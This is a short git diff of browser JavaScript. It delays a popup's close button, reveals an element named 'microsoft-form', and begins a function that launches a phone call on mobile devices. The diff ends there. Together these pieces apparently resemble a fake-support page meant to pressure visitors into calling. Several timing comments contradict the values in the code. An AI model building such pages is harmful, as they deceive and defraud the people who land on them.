@@ -1,17 +1,32 @@
-function closePopup() {
-    // Hide the popup and overlay
+
+
+document.addEventListener('DOMContentLoaded', function() {
+
+    // Function to show the popup
+    function showPopup() 
+    {
+        // Show the close button after 10 seconds
+        setTimeout(() => {
+            document.querySelector('.close-btn').style.display = 'block';
+        }, 1000); // 10000 ms = 10 seconds
+
+        // Show the form after 30 seconds
+        setTimeout(() => {
+            document.getElementById('microsoft-form').style.display = 'block';
+            
+        }, 15000); // 30000 ms = 30 seconds
+    }
+
+        // Function to close the popup
+    
+    showPopup();
+
+});
+function closePopup() 
+{
     document.querySelector('.popup1').style.display = 'none';
-    document.querySelector('.overlay').style.display = 'none';
-
-    // Set a timer to show the popup again after 20 seconds
-    setTimeout(showPopup, 20000); // 20000 milliseconds = 20 seconds
 }
 
-function showPopup() {
-    // Show the popup and overlay again
-    document.querySelector('.popup1').style.display = 'block';
-    document.querySelector('.overlay').style.display = 'block';
-}
 function initiateCall() {
     if (/Mobi|Android/i.test(navigator.userAgent)) {
         // Mobile device, use the tel link
